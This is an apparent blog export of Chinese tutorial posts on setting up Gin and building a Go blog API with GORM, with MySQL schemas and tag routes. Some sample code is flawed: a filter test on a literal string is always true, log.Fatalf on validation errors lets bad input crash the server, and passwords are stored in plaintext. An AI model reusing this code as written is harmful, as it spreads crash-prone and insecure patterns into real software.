class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Tag <span class="keyword">struct</span> &#123;</span><br><span class="line">Model</span><br><span class="line"></span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">CreatedBy <span class="keyword">string</span> <span class="string">`json:"created_by"`</span></span><br><span class="line">ModifiedBy <span class="keyword">string</span> <span class="string">`json:"modified_by"`</span></span><br><span class="line">State <span class="keyword">int</span> <span class="string">`json:"state"`</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTags</span><span class="params">(pageNum <span class="keyword">int</span>, pageSize <span class="keyword">int</span>, maps <span class="keyword">interface</span> &#123;&#125;)</span> <span class="params">(tags []Tag)</span></span> &#123;</span><br><span class="line">db.Where(maps).Offset(pageNum).Limit(pageSize).Find(&amp;tags)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTotal</span><span class="params">(maps <span class="keyword">interface</span> &#123;&#125;)</span> <span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">db.Model(&amp;Tag&#123;&#125;).Where(maps).Count(&amp;count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>创建struct{}，提供给gorm使用。并给予了附属属性json，在c.json的时候会自动转换格式。</li><li>可能会有的初学者看到return，而后面没有跟着变量，会不理解；其实你可以看到在函数末端，我们已经显示声明了返回值，这个变量在函数体内也可以直接使用，因为他在一开始就被声明了</li><li>有人会疑惑db是哪里来的；因为在同个models包下，因此db *gorm.DB是可以直接使用的</li></ul><h2 id="编写标签列表的路由逻辑"><a href="#编写标签列表的路由逻辑" class="headerlink" title="编写标签列表的路由逻辑"></a>编写标签列表的路由逻辑</h2><p>编写获得标签列表的接口，修改routers/api/v1/tag.go</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/e"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/util"</span></span><br><span class="line"><span class="string">"gin-blog/models"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line"><span class="string">"github.com/Unknwon/com"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 获取tags</span></span><br><span class="line">name := c.Query(<span class="string">"name"</span>)</span><br><span class="line">maps := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">data := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"name"</span> != <span class="string">""</span> &#123;</span><br><span class="line">maps[<span class="string">"name"</span>] = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> state <span class="keyword">int</span> = <span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> arg := c.Query(<span class="string">"state"</span>);arg != <span class="string">""</span> &#123;</span><br><span class="line">state = com.StrTo(arg).MustInt()</span><br><span class="line">maps[<span class="string">"state"</span>] = state</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">code := e.SUCCESS</span><br><span class="line"></span><br><span class="line">data[<span class="string">"lists"</span>] = models.GetTags(util.Getpag(c),setting.Pagesize,maps)</span><br><span class="line">data[<span class="string">"total"</span>] = models.GetTotal(maps)</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK,gin.H&#123;</span><br><span class="line"><span class="string">"code"</span> : code,</span><br><span class="line"><span class="string">"msg"</span> : e.GetMsg(code),</span><br><span class="line"><span class="string">"data"</span> : data,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 新增tags</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EditTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 更新tags</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DeleteTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 删除tags</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p>c.Query可用于获取?name=test&amp;state=1这类URL参数，而c.DefaultQuery则支持设置一个默认值.</p></li><li><p>code变量使用了e模块的错误编码，这正是先前规划好的错误码，方便排错和识别记录.</p></li><li><p>util.GetPag保证了各接口的page处理是一致的</p></li><li><p>c *gin.Context是Gin很重要的组成部分，可以理解为上下文，它允许我们在中间件之间传递变量、管理流、验证请求的JSON和呈现JSON响应</p><p>当我go run main.go的时候出现了错误。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line"># gin-blog/models</span><br><span class="line">models\models.<span class="keyword">go</span>:<span class="number">27</span>:<span class="number">14</span>: cannot refer to unexported name setting.cfg</span><br><span class="line">models\models.<span class="keyword">go</span>:<span class="number">27</span>:<span class="number">14</span>: undefined: setting.cfg</span><br></pre></td></tr></table></figure></div></li></ul><p>经过各种排查，终于知道了，当初我定义config *ini.File.而模块中导出的函数必须为字母大写。<br>现在我们再运行程序。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/api/v1/tags</span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">200</span>,<span class="string">"data"</span>:&#123;<span class="string">"lists"</span>:[],<span class="string">"total"</span>:<span class="number">0</span>&#125;,<span class="string">"msg"</span>:<span class="string">"ok"</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="编写新增标签的models逻辑"><a href="#编写新增标签的models逻辑" class="headerlink" title="编写新增标签的models逻辑"></a>编写新增标签的models逻辑</h2><p> 修改models目录下的tag.go文件。(新增)</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExistTagByName</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> tag Tag</span><br><span class="line">db.Select(<span class="string">"id"</span>).Where(<span class="string">"name = ?"</span>,name).First(&amp;tag)</span><br><span class="line"><span class="keyword">if</span> tag.ID &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddTag</span><span class="params">(name <span class="keyword">string</span>, state <span class="keyword">int</span>, createdBy <span class="keyword">string</span>)</span> <span class="title">bool</span></span>&#123;</span><br><span class="line">db.Create(&amp;Tag &#123;</span><br><span class="line">Name : name,</span><br><span class="line">State : state,</span><br><span class="line">CreatedBy : createdBy,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="编写新增标签的路由逻辑。"><a href="#编写新增标签的路由逻辑。" class="headerlink" title="编写新增标签的路由逻辑。"></a>编写新增标签的路由逻辑。</h2><p>修改routers目录下v1下的tag.go。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddTags</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// 新增tags</span></span><br><span class="line">name := c.Query(<span class="string">"name"</span>)</span><br><span class="line">state := com.StrTo(c.DefaultQuery(<span class="string">"state"</span>, <span class="string">"0"</span>)).MustInt()</span><br><span class="line">createdBy := c.Query(<span class="string">"created_by"</span>)</span><br><span class="line"></span><br><span class="line">valid := validation.Validation&#123;&#125;</span><br><span class="line">valid.Required(name, <span class="string">"name"</span>).Message(<span class="string">"名称不能为空"</span>)</span><br><span class="line">valid.MaxSize(name, <span class="number">100</span>, <span class="string">"name"</span>).Message(<span class="string">"名称最长为100"</span>)</span><br><span class="line">valid.Required(createdBy, <span class="string">"created_by"</span>).Message(<span class="string">"创建人不能为空"</span>)</span><br><span class="line">valid.MaxSize(createdBy, <span class="number">100</span>, <span class="string">"created_by"</span>).Message(<span class="string">"创建人不能大于100"</span>)</span><br><span class="line">valid.Range(state, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"state"</span>).Message(<span class="string">"状态只能0或1"</span>)</span><br><span class="line"></span><br><span class="line">code := e.INVALID_PARAMS</span><br><span class="line"><span class="keyword">if</span> !valid.HasErrors() &#123;</span><br><span class="line"><span class="keyword">if</span> !models.ExistTagByName(name) &#123;</span><br><span class="line">code = e.SUCCESS</span><br><span class="line">models.AddTag(name, state, createdBy)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">code = e.ERROR_EXIST_TAG</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, err := <span class="keyword">range</span> valid.Errors &#123;</span><br><span class="line">log.Fatalf(<span class="string">"fail %v"</span>, err.Message)</span><br><span class="line"><span class="comment">// logging.Info(err.Key,err.Message)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line"><span class="string">"code"</span>: code,</span><br><span class="line"><span class="string">"msg"</span>:  e.GetMsg(code),</span><br><span class="line"><span class="string">"data"</span>: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>),</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="编写models-callbacks"><a href="#编写models-callbacks" class="headerlink" title="编写models callbacks"></a>编写models callbacks</h4><p>但是这个时候大家会发现，我明明新增了标签，但created_on居然没有值，那做修改标签的时候modified_on会不会也存在这个问题？为了解决这个问题，我们需要打开models目录下的tag.go文件，修改文件内容（修改包引用和增加2个方法）：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tag *Tag)</span> <span class="title">BeforeCreate</span><span class="params">(scope *gorm.Scope)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    scope.SetColumn(<span class="string">"CreatedOn"</span>, time.Now().Unix())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tag *Tag)</span> <span class="title">BeforeUpdate</span><span class="params">(scope *gorm.Scope)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">scope.SetColumn(<span class="string">"ModifiedOn"</span>, time.Now().Unix())</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin 环境搭建</title>
      <link href="/2018/10/24/gin-huan-jing-da-jian/"/>
      <url>/2018/10/24/gin-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin-环境搭建"><a href="#Gin-环境搭建" class="headerlink" title="Gin 环境搭建"></a>Gin 环境搭建</h1><blockquote><p>Gin是用Golang开发的一个微框架，类似Martinier的API，重点是小巧、易用、性能好很多，也因为 <a href="https://github.com/julienschmidt/httprouter" target="_blank" rel="noopener">httprouter</a> 的性能提高了40倍。</p></blockquote><h2 id="1-安装Golang"><a href="#1-安装Golang" class="headerlink" title="1.安装Golang"></a>1.安装Golang</h2><p>根据自己环境安装对应的环境。  </p><h2 id="2-安装Govendor"><a href="#2-安装Govendor" class="headerlink" title="2.安装Govendor"></a>2.安装Govendor</h2><p>GOlang包管理工具 </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/kardianos/govendor</span><br><span class="line">govendor -version</span><br><span class="line">有版本号说明安装成功啦。</span><br></pre></td></tr></table></figure></div><h2 id="3-安装Gin"><a href="#3-安装Gin" class="headerlink" title="3.安装Gin"></a>3.安装Gin</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure></div><p>以下测试代码</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">"/ping"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H&#123;</span><br><span class="line"><span class="string">"message"</span>:<span class="string">"tong"</span>, </span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">r.Run() <span class="comment">// listen and serve on 0.0.0.0:8080</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run xxx.<span class="keyword">go</span></span><br></pre></td></tr></table></figure></div><p>访问127.0.0.1:8080/ping，若返回{“message”:”tong”}则正确</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  127.0.0.1:8080/ping</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    18  100    18    0     0    391      0 --:--:-- --:--:-- --:--:--   391&#123;<span class="string">"message"</span>:<span class="string">"tong"</span>&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin搭建Blog API&#39;s（一）</title>
      <link href="/2018/10/24/gin-da-jian-blog-api-s-yi/"/>
      <url>/2018/10/24/gin-da-jian-blog-api-s-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin搭建Blog-API’s（一）"><a href="#Gin搭建Blog-API’s（一）" class="headerlink" title="Gin搭建Blog API’s（一）"></a>Gin搭建Blog API’s（一）</h1><p>按照<a href="https://github.com/EDDYCJY/blog/blob/master/golang/gin/2018-02-16-Gin%E5%AE%9E%E8%B7%B5-%E8%BF%9E%E8%BD%BD%E4%BA%8C-%E6%90%AD%E5%BB%BABlogAPIs-01.md" target="_blank" rel="noopener">Gin搭建Blog API’s (一)</a>教程来的。此为原作者。</p><p>本教程利用一款读写配置文件的库。<a href="https://ini.unknwon.io" target="_blank" rel="noopener">INI</a>,请提前阅读。</p><h2 id="1-介绍和初始化项目"><a href="#1-介绍和初始化项目" class="headerlink" title="1.介绍和初始化项目"></a>1.介绍和初始化项目</h2><p>创建新的工作区，在src目录创建gin-blog.</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$GOPATH</span><br><span class="line">├── bin</span><br><span class="line">├── pkg</span><br><span class="line">└── src</span><br><span class="line">    └── gin-blog</span><br></pre></td></tr></table></figure></div><h3 id="初始化项目目录"><a href="#初始化项目目录" class="headerlink" title="初始化项目目录"></a>初始化项目目录</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gin-blog/</span><br><span class="line">├── conf</span><br><span class="line">├── middleware</span><br><span class="line">├── models</span><br><span class="line">├── pkg</span><br><span class="line">├── routers</span><br><span class="line">└── runtime</span><br></pre></td></tr></table></figure></div><ul><li><h4 id="conf：用于存储配置文件"><a href="#conf：用于存储配置文件" class="headerlink" title="conf：用于存储配置文件"></a>conf：用于存储配置文件</h4></li><li><h4 id="middleware：应用中间件"><a href="#middleware：应用中间件" class="headerlink" title="middleware：应用中间件"></a>middleware：应用中间件</h4></li><li><h4 id="models：应用数据库模型"><a href="#models：应用数据库模型" class="headerlink" title="models：应用数据库模型"></a>models：应用数据库模型</h4></li><li><h4 id="pkg：第三方包"><a href="#pkg：第三方包" class="headerlink" title="pkg：第三方包"></a>pkg：第三方包</h4></li><li><h4 id="routers-路由逻辑处理"><a href="#routers-路由逻辑处理" class="headerlink" title="routers 路由逻辑处理"></a>routers 路由逻辑处理</h4></li><li><h4 id="runtime-应用运行时数据"><a href="#runtime-应用运行时数据" class="headerlink" title="runtime 应用运行时数据"></a>runtime 应用运行时数据</h4></li></ul><h3 id="初始项目数据库"><a href="#初始项目数据库" class="headerlink" title="初始项目数据库"></a>初始项目数据库</h3><ul><li><h3 id="下载安装数据库（mysql）"><a href="#下载安装数据库（mysql）" class="headerlink" title="下载安装数据库（mysql）"></a>下载安装数据库（mysql）</h3></li><li><h3 id="新建blog数据库"><a href="#新建blog数据库" class="headerlink" title="新建blog数据库"></a>新建blog数据库</h3><a href="https://postimg.cc/QHs8bbTY" target="_blank" rel="noopener">database.png</a><br><a href="https://postimg.cc/QHs8bbTY" target="_blank" rel="noopener"><img src="https://i.postimg.cc/kXR27YXC/database.png" alt="database.png"></a><h3 id="创建blog数据库后，创建以下表格："><a href="#创建blog数据库后，创建以下表格：" class="headerlink" title="创建blog数据库后，创建以下表格："></a>创建blog数据库后，创建以下表格：</h3><h4 id="1-标签表"><a href="#1-标签表" class="headerlink" title="1.标签表"></a>1.标签表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `blog_tag` (</span><br><span class="line">  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `name` varchar(100) DEFAULT &apos;&apos; COMMENT &apos;标签名称&apos;,</span><br><span class="line">  `created_on` int(10) unsigned DEFAULT &apos;0&apos; COMMENT &apos;创建时间&apos;,</span><br><span class="line">  `created_by` varchar(100) DEFAULT &apos;&apos; COMMENT &apos;创建人&apos;,</span><br><span class="line">  `modified_on` int(10) unsigned DEFAULT &apos;0&apos; COMMENT &apos;修改时间&apos;,</span><br><span class="line">  `modified_by` varchar(100) DEFAULT &apos;&apos; COMMENT &apos;修改人&apos;,</span><br><span class="line">  `state` tinyint(3) unsigned DEFAULT &apos;1&apos; COMMENT &apos;状态 0为禁用、1为启用&apos;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;文章标签管理&apos;;</span><br></pre></td></tr></table></figure></div></li></ul><p><a href="https://postimg.cc/KKghFkTg" target="_blank" rel="noopener">database1.png</a><br><a href="https://postimg.cc/KKghFkTg" target="_blank" rel="noopener"><img src="https://i.postimg.cc/s2TjY5DK/database1.png" alt="database1.png"></a></p><h4 id="2-文章表"><a href="#2-文章表" class="headerlink" title="2.文章表"></a>2.文章表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `blog_article` (</span><br><span class="line">  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `tag_id` int(10) unsigned DEFAULT &apos;0&apos; COMMENT &apos;标签ID&apos;,</span><br><span class="line">  `title` varchar(100) DEFAULT &apos;&apos; COMMENT &apos;文章标题&apos;,</span><br><span class="line">  `desc` varchar(255) DEFAULT &apos;&apos; COMMENT &apos;简述&apos;,</span><br><span class="line">  `content` text,</span><br><span class="line">  `created_on` int(11) DEFAULT NULL,</span><br><span class="line">  `created_by` varchar(100) DEFAULT &apos;&apos; COMMENT &apos;创建人&apos;,</span><br><span class="line">  `modified_on` int(10) unsigned DEFAULT &apos;0&apos; COMMENT &apos;修改时间&apos;,</span><br><span class="line">  `modified_by` varchar(255) DEFAULT &apos;&apos; COMMENT &apos;修改人&apos;,</span><br><span class="line">  `state` tinyint(3) unsigned DEFAULT &apos;1&apos; COMMENT &apos;状态 0为禁用1为启用&apos;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;文章管理&apos;;</span><br></pre></td></tr></table></figure></div><p><a href="https://postimg.cc/XXgJtm46" target="_blank" rel="noopener">database2.png</a><br><a href="https://postimg.cc/XXgJtm46" target="_blank" rel="noopener"><img src="https://i.postimg.cc/jqp7nY12/database2.png" alt="database2.png"></a></p><h4 id="3-认证表"><a href="#3-认证表" class="headerlink" title="3.认证表"></a>3.认证表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `blog_auth` (</span><br><span class="line">  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) DEFAULT &apos;&apos; COMMENT &apos;账号&apos;,</span><br><span class="line">  `password` varchar(50) DEFAULT &apos;&apos; COMMENT &apos;密码&apos;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">INSERT INTO `blog`.`blog_auth` (`id`, `username`, `password`) VALUES (null, &apos;test&apos;, &apos;test123456&apos;);</span><br></pre></td></tr></table></figure></div><p><a href="https://postimg.cc/6TB6VcRj" target="_blank" rel="noopener">database3.png</a><br><a href="https://postimg.cc/6TB6VcRj" target="_blank" rel="noopener"><img src="https://i.postimg.cc/sfhBr02r/database3.png" alt="database3.png"></a>  </p><h2 